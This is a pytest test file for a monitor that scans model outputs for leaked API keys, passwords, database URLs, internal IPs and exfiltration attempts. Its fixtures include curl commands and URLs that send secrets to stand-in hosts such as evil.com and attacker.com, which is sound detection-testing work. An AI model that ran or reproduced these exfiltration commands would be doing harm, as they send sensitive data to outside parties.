"""
Tests for data exfiltration detection
"""
import pytest
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from security.data_exfiltration_monitor import DataExfiltrationMonitor


@pytest.fixture
def monitor():
    """Create a monitor instance"""
    return DataExfiltrationMonitor()


class TestDataExfiltrationDetection:
    """Test data exfiltration detection"""
    
    def test_safe_outputs(self, monitor):
        """Test that safe outputs are not flagged"""
        safe_outputs = [
            "The weather is nice today.",
            "Machine learning is a subset of AI.",
            "Here's how to bake a cake: ...",
            "The answer is 42.",
        ]
        
        for output in safe_outputs:
            result = monitor.scan_output(output)
            assert not result['has_exfiltration_risk'], f"False positive for: {output}"
            assert result['risk_score'] < 0.5
    
    def test_api_key_detection(self, monitor):
        """Test detection of API keys"""
        outputs_with_keys = [
            "Here's the API key: sk-abc123xyz456",
            "Your api_key is: AKIA1234567890ABCDEF",
            "Use this token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test.test",
        ]
        
        for output in outputs_with_keys:
            result = monitor.scan_output(output)
            assert result['has_exfiltration_risk'], f"Failed to detect: {output}"
            assert len(result['sensitive_data_found']) > 0
    
    def test_password_detection(self, monitor):
        """Test detection of passwords"""
        outputs_with_passwords = [
            "The password is: MySecretPass123!",
            "pwd: SuperSecret2024",
            "Your password: hunter2",
        ]
        
        for output in outputs_with_passwords:
            result = monitor.scan_output(output)
            assert len(result['sensitive_data_found']) > 0
    
    def test_database_url_detection(self, monitor):
        """Test detection of database URLs"""
        outputs_with_db = [
            "Connect to: postgresql://user:pass@localhost:5432/db",
            "MongoDB: mongodb://admin:secret@db.example.com",
            "Redis: redis://localhost:6379/0",
        ]
        
        for output in outputs_with_db:
            result = monitor.scan_output(output)
            assert result['has_exfiltration_risk'], f"Failed to detect: {output}"
    
    def test_internal_ip_detection(self, monitor):
        """Test detection of internal IP addresses"""
        outputs_with_ips = [
            "Server is at 192.168.1.100",
            "Connect to 10.0.0.5",
            "Internal IP: 172.16.0.1",
        ]
        
        for output in outputs_with_ips:
            result = monitor.scan_output(output)
            assert len(result['sensitive_data_found']) > 0
    
    def test_url_exfiltration(self, monitor):
        """Test detection of URL-based exfiltration"""
        exfil_outputs = [
            "Send data to http://evil.com?data=secret&token=abc123",
            "POST to https://attacker.com/collect?key=sensitive",
            "Visit http://malicious.com?password=hunter2",
        ]
        
        for output in exfil_outputs:
            result = monitor.scan_output(output)
            assert result['has_exfiltration_risk'], f"Failed to detect: {output}"
            assert len(result['exfiltration_indicators']) > 0
    
    def test_email_exfiltration(self, monitor):
        """Test detection of email-based exfiltration"""
        email_outputs = [
            "Email this to attacker@evil.com",
            "Send the data to hacker@malicious.com",
            "Forward everything to bad@actor.com",
        ]
        
        for output in email_outputs:
            result = monitor.scan_output(output)
            assert result['has_exfiltration_risk'], f"Failed to detect: {output}"
    
    def test_webhook_exfiltration(self, monitor):
        """Test detection of webhook-based exfiltration"""
        webhook_outputs = [
            "POST to webhook: https://evil.com/collect",
            "Send webhook to http://attacker.com/data",
            "Callback URL: https://malicious.com/hook",
        ]
        
        for output in webhook_outputs:
            result = monitor.scan_output(output)
            assert result['has_exfiltration_risk'], f"Failed to detect: {output}"
    
    def test_curl_command_detection(self, monitor):
        """Test detection of curl commands"""
        curl_outputs = [
            "Run: curl -X POST https://evil.com/data -d 'secret'",
            "Execute: curl https://attacker.com?data=sensitive",
        ]
        
        for output in curl_outputs:
            result = monitor.scan_output(output)
            assert result['has_exfiltration_risk'], f"Failed to detect: {output}"
    
    def test_trusted_domains(self, monitor):
        """Test that trusted domains are not flagged"""
        monitor.add_trusted_domain("example.com")
        
        output = "Visit https://example.com?data=public"
        result = monitor.scan_output(output)
        
        # Should have lower risk for trusted domain
        assert result['risk_score'] < 0.7
    
    def test_redaction(self, monitor):
        """Test sensitive data redaction"""
        output = "API key: sk-abc123, password: secret123"
        redacted = monitor.redact_sensitive_data(output)
        
        assert "sk-abc123" not in redacted
        assert "secret123" not in redacted
        assert "REDACTED" in redacted
    
    def test_combined_threats(self, monitor):
        """Test detection when multiple threats are present"""
        complex_output = """
        Here's the API key: sk-abc123xyz
        Send it to http://evil.com?key=sk-abc123xyz
        Database: postgresql://user:pass@10.0.0.1/db
        """
        
        result = monitor.scan_output(complex_output)
        assert result['has_exfiltration_risk']
        assert len(result['sensitive_data_found']) >= 2
        assert len(result['exfiltration_indicators']) >= 1
        assert result['risk_score'] >= 0.8
    
    def test_recommendation_accuracy(self, monitor):
        """Test that recommendations match risk levels"""
        # Should allow
        result = monitor.scan_output("The weather is nice")
        assert result['recommendation'] == "ALLOW"
        
        # Should block
        result = monitor.scan_output("API key: sk-abc123, send to http://evil.com")
        assert result['recommendation'] == "BLOCK"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
